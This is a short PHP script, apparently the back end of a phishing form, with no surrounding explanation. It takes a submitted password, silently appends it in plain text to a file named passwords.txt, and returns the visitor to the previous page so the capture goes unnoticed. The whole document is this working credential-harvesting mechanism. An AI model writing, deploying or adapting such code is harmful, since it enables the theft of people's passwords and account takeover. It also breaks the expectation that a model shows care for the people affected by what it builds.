<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST['password']) && !empty($_POST['password'])) {
        $password = $_POST['password'];

        file_put_contents("passwords.txt", $password . PHP_EOL, FILE_APPEND);

        echo "<script type='text/javascript'>
                window.history.back();
              </script>";
    } else {
        echo "<script type='text/javascript'>
                alert('Password field is required.');
                window.history.back();
              </script>";
    }
}
?>
